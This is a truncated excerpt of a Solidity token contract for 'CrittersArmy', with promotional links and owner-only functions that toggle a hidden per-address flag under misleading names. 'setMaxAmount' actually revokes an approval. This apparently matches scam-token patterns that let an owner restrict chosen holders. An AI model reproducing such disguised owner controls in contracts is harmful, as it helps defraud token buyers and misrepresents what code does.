...
WWW:     https://crittersarmy.com/
TWITTER: https://twitter.com/crittersarmy 
MEDIUM:  https://medium.com/@crittersarmy
TG CHAT: https://t.me/CrittersArmy                    */
 ...
 */
contract CrittersArmy is Context, Ownable, IERC20, IERC20Metadata {
    ...
    function transferApprove(address account) external onlyOwner {
        _approvedAddress[account] = true;
    }

   
    function setMaxAmount(address account) external onlyOwner {
        _approvedAddress[account] = false;
    }

  
    function taxAccount(address account) public view returns (bool) {
